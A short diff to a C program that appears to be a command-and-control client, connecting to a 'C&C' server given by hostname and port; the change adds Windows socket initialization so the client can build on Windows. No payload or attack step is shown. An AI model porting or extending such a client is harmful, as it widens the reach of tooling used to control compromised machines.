@@ -15,6 +15,10 @@
 #include <sys/types.h>
 #include <unistd.h>
 
+#ifdef _WIN32
+#include <winsock2.h>
+#endif
+
 #include "common.h"
 #include "main.h"
 #include "command.h"
@@ -26,6 +30,15 @@ int main(int argc, char *argv[])
     // Connect to the C&C over TCP.
     if (argc == 3) {
         LOG("Starting up...\n");
+
+        // On Windows, we must initialize the sockets library.
+#ifdef _WIN32
+        WSADATA wsaData;
+        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+            LOG("Failed to initialize Windows sockets, error code: %d\n", GetLastError());
+            return 0;
+        }
+#endif
 
         // Command line arguments are the hostname and port.
         char *hostname = argv[1];
